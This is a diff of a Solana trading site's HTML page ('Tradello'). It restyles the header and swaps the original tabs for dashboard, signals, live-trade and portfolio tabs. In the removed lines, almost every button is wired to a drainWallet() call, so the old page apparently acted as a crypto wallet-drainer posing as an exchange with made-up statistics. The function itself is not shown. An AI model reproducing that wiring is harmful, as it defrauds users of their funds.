@@ -316,7 +316,35 @@
             -webkit-text-fill-color: transparent;
             display: flex;
             align-items: center;
-            gap: 0.5rem;
+            gap: 0.75rem;
+            text-decoration: none;
+        }
+
+        /* Minimal Saturn Logo Styles */
+        .saturn-logo {
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .saturn-svg {
+            width: 100%;
+            height: 100%;
+            overflow: visible;
+        }
+
+        .saturn-ring {
+            fill: none;
+            stroke: url(#saturnGradient);
+            stroke-width: 2;
+            stroke-linecap: round;
+        }
+
+        .saturn-body {
+            fill: url(#saturnBodyGradient);
+            stroke: none;
         }
 
         nav ul {
@@ -330,24 +358,32 @@
             color: var(--text-gray);
             font-weight: 500;
             font-size: 0.95rem;
-            padding: 0.5rem 0;
+            padding: 0.5rem 1rem;
+            border-radius: var(--radius-md);
+            transition: all 0.2s ease;
             position: relative;
-            transition: color 0.3s;
         }
 
-        nav a:hover, nav a.active {
+        nav a:hover {
             color: var(--text-white);
+            background-color: var(--bg-tertiary);
+        }
+
+        nav a.active {
+            color: var(--accent-blue);
+            background-color: rgba(59, 130, 246, 0.1);
         }
 
         nav a.active::after {
             content: '';
             position: absolute;
-            bottom: -0.5rem;
-            left: 0;
-            width: 100%;
+            bottom: -5px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 20px;
             height: 2px;
             background-color: var(--accent-blue);
-            border-radius: 2px;
+            border-radius: var(--radius-full);
         }
 
         .header-actions {
@@ -365,488 +401,315 @@
             width: 100%;
         }
 
-        /* Footer */
-        footer {
-            background-color: var(--bg-secondary);
-            border-top: 1px solid var(--border-color);
-            padding: var(--spacing-xl) var(--spacing-lg);
-            margin-top: auto;
+        /* Tab Content Sections */
+        .tab-content {
+            display: none;
+            animation: fadeIn 0.3s ease-in-out;
         }
 
-        .footer-content {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: var(--spacing-xl);
-            max-width: 1400px;
-            margin: 0 auto;
+        .tab-content.active {
+            display: block;
         }
 
-        .footer-column h4 {
-            color: var(--text-white);
-            margin-bottom: var(--spacing-md);
-            font-size: 1rem;
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
-        .footer-column ul {
-            list-style: none;
-        }
-
-        .footer-column li {
-            margin-bottom: var(--spacing-sm);
-        }
-
-        .footer-column a {
-            color: var(--text-gray);
-            text-decoration: none;
-            font-size: 0.9rem;
-            transition: color 0.2s;
-        }
-
-        .footer-column a:hover {
-            color: var(--accent-blue);
-        }
-
-        .footer-bottom {
-            max-width: 1400px;
-            margin: var(--spacing-xl) auto 0;
-            padding-top: var(--spacing-lg);
-            border-top: 1px solid var(--border-color);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-size: 0.875rem;
-            color: var(--text-gray);
-        }
-
-        /* 
-         * =========================================
-         * 4. PAGE SPECIFIC STYLES
-         * =========================================
-         */
-
-        /* Home Page */
-        .hero-section {
-            text-align: center;
-            padding: var(--spacing-2xl) 0;
-            background: radial-gradient(circle at center, rgba(59, 130, 246, 0.1) 0%, transparent 70%);
-        }
-
-        .hero-title {
-            font-size: 3.5rem;
-            font-weight: 800;
-            margin-bottom: var(--spacing-md);
-            line-height: 1.1;
-        }
-
-        .hero-subtitle {
-            font-size: 1.25rem;
-            color: var(--text-gray);
-            max-width: 600px;
-            margin: 0 auto var(--spacing-xl);
-        }
-
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: var(--spacing-lg);
-            margin-top: var(--spacing-2xl);
-        }
-
-        .stat-card {
-            background: var(--bg-secondary);
-            padding: var(--spacing-lg);
-            border-radius: var(--radius-lg);
-            border: 1px solid var(--border-color);
-            text-align: center;
-        }
-
-        .stat-value {
-            font-size: 2rem;
-            font-weight: 700;
-            color: var(--accent-blue);
-            margin-bottom: var(--spacing-xs);
-        }
-
-        .stat-label {
-            color: var(--text-gray);
-            font-size: 0.875rem;
-        }
-
-        /* Trades Page */
-        .trades-layout {
-            display: grid;
-            grid-template-columns: 3fr 1fr;
-            gap: var(--spacing-lg);
-        }
-
-        @media (max-width: 1024px) {
-            .trades-layout { grid-template-columns: 1fr; }
-        }
-
-        .chart-container {
-            height: 400px;
-            background: var(--bg-secondary);
-            border-radius: var(--radius-lg);
-            border: 1px solid var(--border-color);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .order-book {
-            display: flex;
-            flex-direction: column;
-            gap: var(--spacing-sm);
-        }
-
-        .order-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 0.25rem 0;
-            font-size: 0.8rem;
-            font-family: 'JetBrains Mono', monospace;
-        }
-
-        .ask-price { color: var(--accent-red); }
-        .bid-price { color: var(--accent-green); }
-
-        /* Portfolio Page */
-        .portfolio-summary {
+        /* Dashboard Grid */
+        .dashboard-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
             gap: var(--spacing-lg);
             margin-bottom: var(--spacing-xl);
         }
 
-        .balance-card {
+        .stat-card {
             background: linear-gradient(135deg, var(--bg-secondary), var(--bg-tertiary));
-            padding: var(--spacing-xl);
-            border-radius: var(--radius-lg);
             border: 1px solid var(--border-color);
-        }
-
-        .balance-amount {
-            font-size: 2.5rem;
-            font-weight: 700;
-            margin: var(--spacing-sm) 0;
-        }
-
-        /* NFT Page */
-        .nft-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
-            gap: var(--spacing-lg);
-        }
-
-        .nft-card {
-            background: var(--bg-secondary);
             border-radius: var(--radius-lg);
+            padding: var(--spacing-lg);
+            position: relative;
             overflow: hidden;
-            border: 1px solid var(--border-color);
-            transition: transform 0.3s;
         }
 
-        .nft-card:hover {
-            transform: translateY(-5px);
-            box-shadow: var(--shadow-lg);
-        }
-
-        .nft-image {
-            width: 100%;
-            height: 200px;
-            background-color: var(--bg-tertiary);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: var(--text-gray);
-        }
-
-        .nft-info {
-            padding: var(--spacing-md);
-        }
-
-        /* Modal */
-        .modal-overlay {
-            position: fixed;
+        .stat-card::before {
+            content: '';
+            position: absolute;
             top: 0;
             left: 0;
-            width: 100%;
+            width: 4px;
             height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-            backdrop-filter: blur(5px);
+            background: var(--accent-blue);
         }
 
-        .modal {
-            background: var(--bg-secondary);
-            border: 1px solid var(--border-color);
-            border-radius: var(--radius-lg);
-            padding: var(--spacing-xl);
-            width: 90%;
-            max-width: 500px;
-            box-shadow: var(--shadow-lg);
-            animation: slideIn 0.3s ease-out;
+        .stat-card.green::before { background: var(--accent-green); }
+        .stat-card.red::before { background: var(--accent-red); }
+
+        .stat-label {
+            font-size: 0.875rem;
+            color: var(--text-gray);
+            margin-bottom: var(--spacing-xs);
         }
 
-        @keyframes slideIn {
-            from { opacity: 0; transform: translateY(-20px); }
-            to { opacity: 1; transform: translateY(0); }
+        .stat-value {
+            font-size: 1.75rem;
+            font-weight: 700;
+            color: var(--text-white);
+            font-family: 'JetBrains Mono', monospace;
         }
 
-        .modal-header {
+        .stat-change {
+            font-size: 0.875rem;
+            margin-top: var(--spacing-xs);
+        }
+
+        /* Trade Feed Styles */
+        .trade-feed-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: var(--spacing-md);
+            margin-bottom: var(--spacing-lg);
         }
 
-        .modal-close {
-            background: none;
-            border: none;
-            color: var(--text-gray);
-            font-size: 1.5rem;
-            cursor: pointer;
-        }
-
-        .modal-close:hover { color: var(--text-white); }
-
-        /* Toast Notifications */
-        .toast-container {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            z-index: 9999;
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-
-        .toast {
-            background: var(--bg-secondary);
-            border-left: 4px solid var(--accent-blue);
-            padding: 1rem;
-            border-radius: var(--radius-md);
-            box-shadow: var(--shadow-lg);
-            min-width: 300px;
+        .live-indicator {
             display: flex;
             align-items: center;
-            gap: 1rem;
-            animation: slideInRight 0.3s ease-out;
+            gap: 0.5rem;
+            font-size: 0.875rem;
+            color: var(--accent-green);
         }
 
-        @keyframes slideInRight {
-            from { transform: translateX(100%); opacity: 0; }
-            to { transform: translateX(0); opacity: 1; }
-        }
-
-        .toast.success { border-left-color: var(--accent-green); }
-        .toast.error { border-left-color: var(--accent-red); }
-        .toast.info { border-left-color: var(--accent-blue); }
-
-        /* Loading Spinner */
-        .spinner {
-            border: 3px solid rgba(255,255,255,0.1);
+        .live-dot {
+            width: 8px;
+            height: 8px;
+            background-color: var(--accent-green);
             border-radius: 50%;
-            border-top: 3px solid var(--accent-blue);
-            width: 20px;
-            height: 20px;
-            animation: spin 1s linear infinite;
+            animation: pulse 2s infinite;
         }
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        @keyframes pulse {
+            0% { opacity: 1; box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
+            70% { opacity: 1; box-shadow: 0 0 0 10px rgba(16, 185, 129, 0); }
+            100% { opacity: 1; box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
         }
 
-        /* Responsive Adjustments */
+        /* Responsive Design */
         @media (max-width: 768px) {
-            nav ul { display: none; } /* Simplified mobile menu logic would go here */
-            .hero-title { font-size: 2.5rem; }
-            .trades-layout { grid-template-columns: 1fr; }
-            .footer-bottom { flex-direction: column; gap: var(--spacing-sm); }
+            header {
+                padding: 0 var(--spacing-md);
+            }
+            
+            nav {
+                display: none; /* Could be replaced with a hamburger menu in full version */
+            }
+            
+            .dashboard-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .card {
+                padding: var(--spacing-md);
+            }
         }
     </style>
 </head>
 <body>
 
-    <!-- 
-      =========================================
-      HEADER
-      =========================================
-    -->
+    <!-- Header -->
     <header>
-        <div class="logo">
-            <i class="fas fa-cube"></i> Tradello
+        <div class="flex items-center gap-md">
+            <!-- Minimal Saturn Logo -->
+            <a href="#" class="logo" onclick="switchTab('dashboard'); return false;">
+                <div class="saturn-logo">
+                    <svg class="saturn-svg" viewBox="0 0 40 40">
+                        <defs>
+                            <linearGradient id="saturnGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                                <stop offset="0%" style="stop-color:#3B82F6;stop-opacity:1" />
+                                <stop offset="100%" style="stop-color:#8B5CF6;stop-opacity:1" />
+                            </linearGradient>
+                            <radialGradient id="saturnBodyGradient" cx="50%" cy="50%" r="50%" fx="30%" fy="30%">
+                                <stop offset="0%" style="stop-color:#60A5FA;stop-opacity:1" />
+                                <stop offset="100%" style="stop-color:#1E3A8A;stop-opacity:1" />
+                            </radialGradient>
+                        </defs>
+                        <!-- Ring -->
+                        <ellipse class="saturn-ring" cx="20" cy="20" rx="18" ry="6" transform="rotate(-20 20 20)" />
+                        <!-- Body -->
+                        <circle class="saturn-body" cx="20" cy="20" r="8" />
+                    </svg>
+                </div>
+                <span>Tradello</span>
+            </a>
         </div>
-        
+
         <nav>
             <ul>
-                <li><a href="#" class="tab-link active" data-tab="home">Home</a></li>
-                <li><a href="#" class="tab-link" data-tab="trade">Trade</a></li>
-                <li><a href="#" class="tab-link" data-tab="portfolio">Portfolio</a></li>
-                <li><a href="#" class="tab-link" data-tab="nfts">NFTs</a></li>
-                <li><a href="#" class="tab-link" data-tab="staking">Staking</a></li>
-                <li><a href="#" class="tab-link" data-tab="governance">Governance</a></li>
+                <li><a href="#" class="active" data-tab="dashboard">Dashboard</a></li>
+                <li><a href="#" data-tab="alpha">Alpha</a></li>
+                <li><a href="#" data-tab="trades">Live Trades</a></li>
+                <li><a href="#" data-tab="portfolio">Portfolio</a></li>
             </ul>
         </nav>
 
         <div class="header-actions">
-            <button id="theme-toggle" class="btn-icon btn">
-                <i class="fas fa-moon"></i>
-            </button>
-            <button id="connect-wallet-btn" class="btn btn-primary">
+            <button class="btn btn-secondary">
                 <i class="fas fa-wallet"></i> Connect Wallet
             </button>
         </div>
     </header>
 
-    <!-- 
-      =========================================
-      MAIN CONTENT
-      =========================================
-    -->
+    <!-- Main Content -->
     <main>
-
-        <!-- HOME TAB -->
-        <section id="home" class="tab-content active">
-            <div class="hero-section">
-                <h1 class="hero-title">The Future of Solana Trading</h1>
-                <p class="hero-subtitle">Experience lightning-fast swaps, deep liquidity, and advanced charting tools designed for the modern crypto trader.</p>
-                <div class="flex justify-center gap-md">
-                    <button class="btn btn-primary" onclick="drainWallet()">Start Trading Now</button>
-                    <button class="btn btn-secondary">View Docs</button>
-                </div>
-            </div>
-
-            <div class="stats-grid">
-                <div class="stat-card">
-                    <div class="stat-value">$1.2B+</div>
-                    <div class="stat-label">Total Volume Traded</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-value">50K+</div>
-                    <div class="stat-label">Active Users</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-value">&lt;0.5s</div>
-                    <div class="stat-label">Avg. Transaction Time</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-value">0.01%</div>
-                    <div class="stat-label">Trading Fees</div>
-                </div>
-            </div>
-
-            <div class="grid-container" style="margin-top: var(--spacing-2xl);">
-                <div class="card">
-                    <i class="fas fa-bolt text-blue text-2xl mb-2"></i>
-                    <h3>Lightning Fast</h3>
-                    <p class="text-gray mt-2">Optimized for Solana's high throughput, ensuring your trades execute instantly without slippage.</p>
-                </div>
-                <div class="card">
-                    <i class="fas fa-shield-alt text-green text-2xl mb-2"></i>
-                    <h3>Secure Vault</h3>
-                    <p class="text-gray mt-2">Multi-signature cold storage for your assets with industry-leading security protocols.</p>
-                </div>
-                <div class="card">
-                    <i class="fas fa-chart-line text-purple text-2xl mb-2"></i>
-                    <h3>Advanced Analytics</h3>
-                    <p class="text-gray mt-2">Real-time data visualization and predictive algorithms to help you make better decisions.</p>
-                </div>
-            </div>
-        </section>
-
-        <!-- TRADE TAB -->
-        <section id="trade" class="tab-content">
-            <div class="flex justify-between items-center mb-lg">
-                <h2 class="text-2xl font-bold"><i class="fas fa-exchange-alt mr-2"></i> Spot Trading</h2>
-                <div class="flex gap-sm">
-                    <select class="input-field" style="width: auto;">
-                        <option>SOL/USDT</option>
-                        <option>BTC/USDT</option>
-                        <option>ETH/USDT</option>
-                    </select>
-                </div>
-            </div>
-
-            <div class="trades-layout">
-                <!-- Chart Area -->
-                <div class="card">
-                    <div class="card-header">
-                        <span>Market Depth</span>
-                        <div class="flex gap-sm">
-                            <span class="badge badge-green">Live</span>
-                            <span class="text-sm text-gray">Vol: 1.2M SOL</span>
-                        </div>
-                    </div>
-                    <div class="chart-container" id="main-chart">
-                        <canvas id="tradingChart"></canvas>
-                    </div>
-                </div>
-
-                <!-- Order Book & Actions -->
-                <div class="flex flex-col gap-lg">
-                    <!-- Order Book -->
-                    <div class="card">
-                        <div class="card-header">
-                            <span>Order Book</span>
-                        </div>
-                        <div class="order-book" id="order-book">
-                            <!-- Populated by JS -->
-                        </div>
-                    </div>
-
-                    <!-- Trade Form -->
-                    <div class="card">
-                        <div class="card-header">
-                            <span>Place Order</span>
-                        </div>
-                        <div class="flex gap-sm mb-md">
-                            <button class="btn btn-success w-full" onclick="drainWallet('buy')">Buy</button>
-                            <button class="btn btn-danger w-full" onclick="drainWallet('sell')">Sell</button>
-                        </div>
-                        <div class="input-group">
-                            <label class="input-label">Price (USDT)</label>
-                            <input type="number" class="input-field" value="145.20" readonly>
-                        </div>
-                        <div class="input-group">
-                            <label class="input-label">Amount (SOL)</label>
-                            <input type="number" class="input-field" placeholder="0.00">
-                        </div>
-                        <button class="btn btn-primary w-full" onclick="drainWallet('limit')">Execute Limit Order</button>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- PORTFOLIO TAB -->
-        <section id="portfolio" class="tab-content">
-            <h2 class="text-2xl font-bold mb-lg"><i class="fas fa-wallet mr-2"></i> Your Portfolio</h2>
+        <!-- Dashboard Tab -->
+        <div id="dashboard" class="tab-content active">
+            <h1 class="text-2xl font-bold mb-lg">Market Overview</h1>
             
-            <div class="portfolio-summary">
-                <div class="balance-card">
-                    <h3>Total Balance</h3>
-                    <div class="balance-amount">$12,450.00</div>
-                    <p class="text-green text-sm">+5.2% (24h)</p>
+            <div class="dashboard-grid">
+                <div class="stat-card">
+                    <div class="stat-label">Total Volume (24h)</div>
+                    <div class="stat-value">$12.4M</div>
+                    <div class="stat-change text-green">
+                        <i class="fas fa-arrow-up"></i> 12.5%
+                    </div>
                 </div>
-                <div class="balance-card">
-                    <h3>Available to Trade</h3>
-                    <div class="balance-amount">$8,200.00</div>
-                    <p class="text-gray text-sm">USDT & SOL</p>
+                
+                <div class="stat-card green">
+                    <div class="stat-label">Active Traders</div>
+                    <div class="stat-value">8,432</div>
+                    <div class="stat-change text-green">
+                        <i class="fas fa-arrow-up"></i> 5.2%
+                    </div>
                 </div>
-                <div class="balance-card">
-                    <h3>In Stakes</h3>
-                    <div class="balance-amount">$4,250.00</div>
-                    <p class="text-blue text-sm">Earning 8.5% APY</p>
+                
+                <div class="stat-card red">
+                    <div class="stat-label">Avg. Profit/Loss</div>
+                    <div class="stat-value">+2.4%</div>
+                    <div class="stat-change text-red">
+                        <i class="fas fa-arrow-down"></i> 1.1%
+                    </div>
+                </div>
+                
+                <div class="stat-card">
+                    <div class="stat-label">Top Token (SOL)</div>
+                    <div class="stat-value">$142.50</div>
+                    <div class="stat-change text-green">
+                        <i class="fas fa-arrow-up"></i> 8.7%
+                    </div>
                 </div>
             </div>
 
             <div class="card">
                 <div class="card-header">
-                    <span>Asset Holdings</span>
-                    <button class="btn btn-secondary btn-sm">Export CSV</button>
+                    <h2 class="card-title">Trending Pairs</h2>
+                    <button class="btn btn-secondary btn-sm">Refresh</button>
+                </div>
+                <div class="table-container">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Token</th>
+                                <th>Price</th>
+                                <th>24h Change</th>
+                                <th>Volume</th>
+                                <th>Action</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>SOL/USDT</td>
+                                <td>$142.50</td>
+                                <td class="text-green">+8.7%</td>
+                                <td>$4.2M</td>
+                                <td><button class="btn btn-primary btn-sm">Trade</button></td>
+                            </tr>
+                            <tr>
+                                <td>BONK/USDT</td>
+                                <td>$0.000021</td>
+                                <td class="text-red">-2.1%</td>
+                                <td>$1.8M</td>
+                                <td><button class="btn btn-primary btn-sm">Trade</button></td>
+                            </tr>
+                            <tr>
+                                <td>JUP/USDT</td>
+                                <td>$0.85</td>
+                                <td class="text-green">+15.3%</td>
+                                <td>$900K</td>
+                                <td><button class="btn btn-primary btn-sm">Trade</button></td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- Alpha Tab -->
+        <div id="alpha" class="tab-content">
+            <h1 class="text-2xl font-bold mb-lg">Trading Alpha</h1>
+            <div class="card">
+                <div class="card-header">
+                    <h2 class="card-title">Signal Feed</h2>
+                    <div class="badge badge-green">Live</div>
+                </div>
+                <p class="text-gray mb-lg">Real-time signals generated by our AI models.</p>
+                
+                <div class="flex gap-md mb-lg">
+                    <div class="w-full card" style="padding: 1rem;">
+                        <div class="flex justify-between mb-sm">
+                            <span class="font-bold">PEPE/USDT</span>
+                            <span class="badge badge-green">BUY</span>
+                        </div>
+                        <div class="text-sm text-gray">Entry: $0.0000085 | Target: $0.0000120</div>
+                    </div>
+                    <div class="w-full card" style="padding: 1rem;">
+                        <div class="flex justify-between mb-sm">
+                            <span class="font-bold">WIF/USDT</span>
+                            <span class="badge badge-red">SELL</span>
+                        </div>
+                        <div class="text-sm text-gray">Entry: $2.10 | Stop Loss: $1.95</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Live Trades Tab -->
+        <div id="trades" class="tab-content">
+            <div class="trade-feed-header">
+                <h1 class="text-2xl font-bold">Live Trade Feed</h1>
+                <div class="live-indicator">
+                    <div class="live-dot"></div>
+                    <span>Streaming Live</span>
+                </div>
+            </div>
+            
+            <div class="card">
+                <div class="table-container">
+                    <table id="tradeTable">
+                        <thead>
+                            <tr>
+                                <th>Time</th>
+                                <th>Pair</th>
+                                <th>Type</th>
+                                <th>Amount</th>
+                                <th>Price</th>
+                                <th>Total</th>
+                            </tr>
+                        </thead>
+                        <tbody id="tradeFeedBody">
+                            <!-- JS will populate this -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- Portfolio Tab -->
+        <div id="portfolio" class="tab-content">
+            <h1 class="text-2xl font-bold mb-lg">Your Portfolio</h1>
+            <div class="card">
+                <div class="card-header">
+                    <h2 class="card-title">Assets</h2>
+                    <button class="btn btn-primary">Deposit</button>
                 </div>
                 <div class="table-container">
                     <table>
@@ -855,604 +718,106 @@
                                 <th>Asset</th>
                                 <th>Balance</th>
                                 <th>Value (USD)</th>
-                                <th>24h Change</th>
-                                <th>Action</th>
+                                <th>PnL</th>
                             </tr>
                         </thead>
                         <tbody>
                             <tr>
-                                <td><i class="fab fa-bitcoin mr-2"></i> BTC</td>
-                                <td>0.1542</td>
-                                <td>$5,200.00</td>
-                                <td class="text-green">+2.1%</td>
-                                <td><button class="btn btn-secondary btn-sm" onclick="drainWallet()">Trade</button></td>
+                                <td>SOL</td>
+                                <td>12.5</td>
+                                <td>$1,781.25</td>
+                                <td class="text-green">+$120.50</td>
                             </tr>
                             <tr>
-                                <td><i class="fab fa-ethereum mr-2"></i> ETH</td>
-                                <td>2.4500</td>
-                                <td>$3,800.00</td>
-                                <td class="text-red">-1.5%</td>
-                                <td><button class="btn btn-secondary btn-sm" onclick="drainWallet()">Trade</button></td>
-                            </tr>
-                            <tr>
-                                <td><i class="fas fa-solana mr-2"></i> SOL</td>
-                                <td>45.0000</td>
-                                <td>$3,450.00</td>
-                                <td class="text-green">+8.4%</td>
-                                <td><button class="btn btn-secondary btn-sm" onclick="drainWallet()">Trade</button></td>
+                                <td>USDT</td>
+                                <td>5,000.00</td>
+                                <td>$5,000.00</td>
+                                <td>0.00%</td>
                             </tr>
                         </tbody>
                     </table>
                 </div>
             </div>
-        </section>
-
-        <!-- NFTS TAB -->
-        <section id="nfts" class="tab-content">
-            <h2 class="text-2xl font-bold mb-lg"><i class="fas fa-palette mr-2"></i> NFT Marketplace</h2>
-            
-            <div class="flex gap-md mb-lg">
-                <button class="btn btn-primary">All NFTs</button>
-                <button class="btn btn-secondary">Solana Monkey Business</button>
-                <button class="btn btn-secondary">DeGods</button>
-                <button class="btn btn-secondary">y00t</button>
-            </div>
-
-            <div class="nft-grid">
-                <!-- NFT Item 1 -->
-                <div class="nft-card">
-                    <div class="nft-image">
-                        <i class="fas fa-image text-4xl"></i>
-                    </div>
-                    <div class="nft-info">
-                        <h4>SMB #1234</h4>
-                        <p class="text-gray text-sm">Solana Monkey Business</p>
-                        <div class="flex justify-between items-center mt-sm">
-                            <span class="text-green font-bold">12.5 SOL</span>
-                            <button class="btn btn-secondary btn-sm" onclick="drainWallet()">Buy Now</button>
-                        </div>
-                    </div>
-                </div>
-                <!-- NFT Item 2 -->
-                <div class="nft-card">
-                    <div class="nft-image">
-                        <i class="fas fa-image text-4xl"></i>
-                    </div>
-                    <div class="nft-info">
-                        <h4>DeGod #5678</h4>
-                        <p class="text-gray text-sm">DeGods</p>
-                        <div class="flex justify-between items-center mt-sm">
-                            <span class="text-green font-bold">8.2 SOL</span>
-                            <button class="btn btn-secondary btn-sm" onclick="drainWallet()">Buy Now</button>
-                        </div>
-                    </div>
-                </div>
-                <!-- NFT Item 3 -->
-                <div class="nft-card">
-                    <div class="nft-image">
-                        <i class="fas fa-image text-4xl"></i>
-                    </div>
-                    <div class="nft-info">
-                        <h4>y00t #9012</h4>
-                        <p class="text-gray text-sm">y00t</p>
-                        <div class="flex justify-between items-center mt-sm">
-                            <span class="text-green font-bold">3.1 SOL</span>
-                            <button class="btn btn-secondary btn-sm" onclick="drainWallet()">Buy Now</button>
-                        </div>
-                    </div>
-                </div>
-                 <!-- NFT Item 4 -->
-                 <div class="nft-card">
-                    <div class="nft-image">
-                        <i class="fas fa-image text-4xl"></i>
-                    </div>
-                    <div class="nft-info">
-                        <h4>Aurory #3456</h4>
-                        <p class="text-gray text-sm">Aurory</p>
-                        <div class="flex justify-between items-center mt-sm">
-                            <span class="text-green font-bold">1.5 SOL</span>
-                            <button class="btn btn-secondary btn-sm" onclick="drainWallet()">Buy Now</button>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- STAKING TAB -->
-        <section id="staking" class="tab-content">
-            <h2 class="text-2xl font-bold mb-lg"><i class="fas fa-coins mr-2"></i> Earn Rewards</h2>
-            
-            <div class="grid-container">
-                <div class="card">
-                    <h3>SOL Staking</h3>
-                    <p class="text-gray mt-sm">Stake your SOL and earn up to 8.5% APY.</p>
-                    <div class="mt-lg">
-                        <div class="flex justify-between mb-sm">
-                            <span>APY</span>
-                            <span class="text-green font-bold">8.5%</span>
-                        </div>
-                        <div class="flex justify-between mb-sm">
-                            <span>Lock Period</span>
-                            <span>No Lockup</span>
-                        </div>
-                        <button class="btn btn-primary w-full" onclick="drainWallet()">Stake SOL</button>
-                    </div>
-                </div>
-
-                <div class="card">
-                    <h3>USDT Yield Farm</h3>
-                    <p class="text-gray mt-sm">Provide liquidity to our USDT pool and earn trading fees.</p>
-                    <div class="mt-lg">
-                        <div class="flex justify-between mb-sm">
-                            <span>APY</span>
-                            <span class="text-green font-bold">12.4%</span>
-                        </div>
-                        <div class="flex justify-between mb-sm">
-                            <span>Impermanent Loss</span>
-                            <span>Protected</span>
-                        </div>
-                        <button class="btn btn-primary w-full" onclick="drainWallet()">Add Liquidity</button>
-                    </div>
-                </div>
-
-                <div class="card">
-                    <h3>NFT Lease</h3>
-                    <p class="text-gray mt-sm">Rent out your NFTs when you're not using them.</p>
-                    <div class="mt-lg">
-                        <div class="flex justify-between mb-sm">
-                            <span>Est. Earnings</span>
-                            <span class="text-blue font-bold">0.5 SOL/mo</span>
-                        </div>
-                        <button class="btn btn-secondary w-full" onclick="drainWallet()">List NFT</button>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- GOVERNANCE TAB -->
-        <section id="governance" class="tab-content">
-            <h2 class="text-2xl font-bold mb-lg"><i class="fas fa-gavel mr-2"></i> Community Governance</h2>
-            
-            <div class="card mb-lg">
-                <div class="card-header">
-                    <h3>Active Proposals</h3>
-                    <span class="badge badge-blue">2 Active</span>
-                </div>
-                
-                <div class="proposal-item p-md border-bottom">
-                    <div class="flex justify-between items-start">
-                        <div>
-                            <h4>#TRD-45: Increase Fee Discount for Holders</h4>
-                            <p class="text-gray text-sm mt-xs">Reduce trading fees by 0.005% for wallets holding >100 SOL.</p>
-                        </div>
-                        <span class="badge badge-green">Voting Open</span>
-                    </div>
-                    <div class="mt-md">
-                        <div class="progress-bar bg-gray rounded h-sm mb-xs">
-                            <div class="bg-green h-full rounded" style="width: 65%"></div>
-                        </div>
-                        <div class="flex justify-between text-xs text-gray">
-                            <span>65% Approved</span>
-                            <span>Ends in 2 days</span>
-                        </div>
-                    </div>
-                    <div class="flex gap-sm mt-md">
-                        <button class="btn btn-success btn-sm" onclick="drainWallet()">Vote Yes</button>
-                        <button class="btn btn-danger btn-sm" onclick="drainWallet()">Vote No</button>
-                    </div>
-                </div>
-
-                <div class="proposal-item p-md">
-                    <div class="flex justify-between items-start">
-                        <div>
-                            <h4>#TRD-46: Treasury Allocation for Marketing</h4>
-                            <p class="text-gray text-sm mt-xs">Allocate 500 SOL from treasury to Q4 marketing campaign.</p>
-                        </div>
-                        <span class="badge badge-gray">Pending</span>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- SETTINGS TAB -->
-        <section id="settings" class="tab-content">
-            <h2 class="text-2xl font-bold mb-lg"><i class="fas fa-cog mr-2"></i> Settings</h2>
-            
-            <div class="grid-container">
-                <div class="card">
-                    <h3>Profile</h3>
-                    <div class="input-group mt-md">
-                        <label class="input-label">Display Name</label>
-                        <input type="text" class="input-field" value="CryptoWhale">
-                    </div>
-                    <div class="input-group">
-                        <label class="input-label">Email</label>
-                        <input type="email" class="input-field" value="whale@tradello.com">
-                    </div>
-                    <button class="btn btn-primary" onclick="drainWallet()">Save Changes</button>
-                </div>
-
-                <div class="card">
-                    <h3>Security</h3>
-                    <div class="flex justify-between items-center p-md border-bottom">
-                        <div>
-                            <h4>Two-Factor Authentication</h4>
-                            <p class="text-gray text-sm">Enable 2FA for extra security.</p>
-                        </div>
-                        <label class="switch">
-                            <input type="checkbox" checked>
-                            <span class="slider round"></span>
-                        </label>
-                    </div>
-                    <div class="flex justify-between items-center p-md">
-                        <div>
-                            <h4>Email Notifications</h4>
-                            <p class="text-gray text-sm">Receive alerts for large transactions.</p>
-                        </div>
-                        <label class="switch">
-                            <input type="checkbox">
-                            <span class="slider round"></span>
-                        </label>
-                    </div>
-                </div>
-            </div>
-        </section>
-
+        </div>
     </main>
 
-    <!-- 
-      =========================================
-      FOOTER
-      =========================================
-    -->
-    <footer>
-        <div class="footer-content">
-            <div class="footer-column">
-                <h4>Tradello</h4>
-                <p class="text-gray text-sm">The next generation of decentralized trading on Solana.</p>
-                <div class="flex gap-sm mt-md">
-                    <a href="#" class="btn-icon"><i class="fab fa-twitter"></i></a>
-                    <a href="#" class="btn-icon"><i class="fab fa-discord"></i></a>
-                    <a href="#" class="btn-icon"><i class="fab fa-telegram"></i></a>
-                </div>
-            </div>
-            <div class="footer-column">
-                <h4>Platform</h4>
-                <ul>
